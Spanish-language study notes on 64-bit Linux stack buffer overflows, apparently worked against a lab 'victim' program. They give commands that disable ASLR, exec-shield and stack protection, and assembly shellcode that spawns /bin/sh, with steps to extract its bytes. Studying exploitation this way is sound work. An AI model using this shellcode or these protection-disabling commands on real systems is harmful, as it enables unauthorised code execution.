http://crypto.stanford.edu/~blynn/rop/
Guia de como explotar un buffer overflow en sistemas modernos (con protecciones) de 64bits.
Ir a #BO_64

http://insecure.org/stf/smashstack.html
Smashing The Stack For Fun And Profit

http://www.madirish.net/142
Writing Buffer Overflows


Quitar la protección ASLR (Address Space Layout Randomization):
  En todo el SO: 
    echo 0 > /proc/sys/kernel/randomize_va_space

  En una ejecucción en concreto:
    setarch x86_64 -R ./victim


Quitar la protección de bit de ejecucción (Exec Shield o DEP):
  En todo el SO:
    echo 0 > /proc/sys/kernel/exec-shield

  En un binario concreto:
    execstack -s victim

      execstack
        pacman -S community/prelink
        yum install prelink


Quitar la proteccion "stack-protector" (y tambien el exec shield):
  gcc -fno-stack-protector -z execstack blame.c -o blame

# Concepto

La idea es escribir en un slot de datos tanta información que nos salgamos de nuestro "hueco" y escribamos en el "return pointer".
Este "return pointer" lo haremos que apunte al inicio de nuestro hueco, donde habremos metido nuestro código malicioso.



# NOP sled
Si el "return pointer" no cae exactamente al inicio de nuestro código no funcionará. Podemos meter instrucciones NOP antes, ya que si cae ahí, irá pasando hasta llegar al comienzo de nuestro programa. La otra opción es ajustar nuestro código justo para que lo apunte bien el puntero.


# Activar core dumps
ulimit -c unlimited


# Organizacion de la memoria
http://duartes.org/gustavo/blog/post/anatomy-of-a-program-in-memory/

 ---------------------------
|  Arguments and variables  |
 ---------------------------
|  Stack                    |
 ---------------------------
|  Stack                    |
 ---------------------------
|  Unused Memory            |
 ---------------------------
|  Unused Memory            |
 ---------------------------
|  Heap                     |
 ---------------------------
|  Program Data             |
 ---------------------------

The stack is reserved for dynamic input and function variables. You need this to be dynamic because at run time a program has no idea what sort of input it will get or need to assign to a variable. Some variables might get their value from user input, some from the system, some from reading files

Ejemplo, un programa que empieza con main() y luego llama a foo()

  ---------------------------
 | data foo                  |
 | return address  (a main)  |
  ---------------------------
 | data main                 |
 | data                      |
 | return address (fin main) |
  ---------------------------

Cada nueva llamada a una función va poniendo un stack encima, cuya última linea apunta a donde tiene que volver al terminar.


#BO_64

Podemos tener el codigo needle escrito directamente en ensamblador.
agujas.asm
needle0: jmp there
here:    pop %rdi
         xor %rax, %rax
         movb $0x3b, %al
         xor %rsi, %rsi
         xor %rdx, %rdx
         syscall
there:   call here
.string "/bin/sh"
needle1: .octa 0xdeadbeef

Compilar:
yasm -p gas -f elf64 agujas.asm -o agujas.o
Linkar:
ld -s -o agujas agujas.o

Debemos coger el codigo hasta antes de "deadbeef", por lo tanto hasta "73(s) 68(h) 00" que sería el final de la cadena /bin/sh (la cadena termina en 00)

od -ax agujas
veremos el contenido del fichero. El primer tramo parace que es algún tipo de información binaria acerca del tipo de ejecutable (aparece ELF al comienzo).

Usaremos xxd para solo coger en hexadecimal el trozo que nos interesa (en AAA pondremos la dirección de memoria donde empieza nuestro código, donde este el jump. Solo se ponen las tres cifras de menor valor, no el 4 ese alto):
xxd -s0xAAA -l32 -p agujas shellcode

Se cojen 32 bytes para ser múltiplo de 8 (por que??)
Podemos ver que terminamos con nuestro código ensamblador escrito en hexadecimal dentro del fichero shellcode.
Tenemos un cambio de linea en el fichero, no se si importa. En el manual está igual.

Tras compilar el victim.c como nos dicen, podemos verlo en ensamblador:
objdump -D victim | sed -n '/<main>/,/^$/p'

Si ejecutamos el programa y vamos a su proc:
cd /proc/$(pidof victim)/
en numa_maps y smaps podemos ver las distintas partes que se tienen cargadas en memoria.
  zona de solo lectura del binario (00400...)
  zona de lectura escritura del binario (00600...)
  carga de distintas librerias (libc, etc)
  zonas de escritura/lectura (aqui veremos que es donde se almacena el array 'name)
  stack
  ...

